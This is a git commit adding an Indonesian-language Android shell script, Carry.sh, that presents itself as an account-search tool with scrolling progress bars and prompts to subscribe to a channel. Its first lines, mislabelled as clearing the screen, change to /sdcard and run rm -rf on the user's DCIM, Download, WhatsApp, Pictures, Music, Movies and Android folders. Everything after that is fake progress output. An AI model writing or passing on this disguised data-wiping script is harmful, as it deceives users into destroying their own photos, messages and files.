380413679c9eca3530601e8bcaa357ea2a182734
ridwankechil <70096802+ridwankechil@users.noreply.github.com>
2020-10-08 12:56:16 +0700

    Create Carry.sh

---
+++ Carry.sh
@@ -0,0 +1,121 @@
+#!/system/xbin/bash
+#AUTHOR:NOTBAD
+#Github:https://github.com/THEIMMORTALHACKER
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR= RIDWAN-KECHIL..       #
+#-Subs. = Mr Kevin.A.           #
+#-subs. = Ridwan Kechil.        #
+#-Team=THEIMMORTALHACKER        #
+#################################
+"
+sleep 1
+
+echo "\033[32;1m[y/n] ! "
+read p;
+
+sleep 2
+
+echo "\033[32;1m
+#-PENCARIAN DALAM progses-#
+______________________________
+|1.pencarian akun anda       |
+|2.harap bersabar sayang     |
+|3.pencarian di mulai        |
+|4.cek cek cek..             |
+|5.progses ...               |
+|6.dimulai......             |
+|7.Subs dulu chnl            |
+|8.Ridwan Kechil.....        |
+|9.Jangan lupa .......       |
+|10.......................   |
+|11.................         |
+|12.bersabar                 |
+|13.✓✓✓✓✓✓✓✓✓✓✓Done         |
+|14.Subscrib\\\\\\\\\        |
+|15.###########100%
+|16.melanjutkan progses.     |
+|17.jangan lupa.             |
+|18.tersenyum....            |
+|19.File Ditemukan....       |
+|20.membuka File.......      |
+|.                           |
+|____________________________|
+Peringatan buat kalian semua jangan pernah menyalah gunakan script orang lain
+>>>>>>>>>>>>>> ....
+"
+echo "\033[32;1mSubscribe Dulu [y/n] : "
+read p;
+
+sleep 2
+echo "Sabar Gan Proses tunggu sampai selesai..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 3
+echo "########80%"
+sleep 4
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 4
+echo "MEMUAT...MEMUAT...MEMUAT"
+sleep 4
+echo "_____________________________________"
+sleep 2
+echo "harap bersabar"
+sleep 2
+echo "progses di butuhkan"
+sleep 2
+echo "Estrack"
+sleep 3
+echo "xx10%"
+sleep 2
+echo "xxxxxxxxxx100%"
+sleep 3
+echo "_0%"
+sleep 2
+echo "##_20%"
+sleep 2
+echo " ####_40%"
+sleep 2
+echo "######_60%"
+sleep 2
+echo "########_80%"
+sleep 2
+echo "##########_100%"
+sleep 4
+echo "____________________________________"
+sleep 4
+echo "buka file sh bash1"
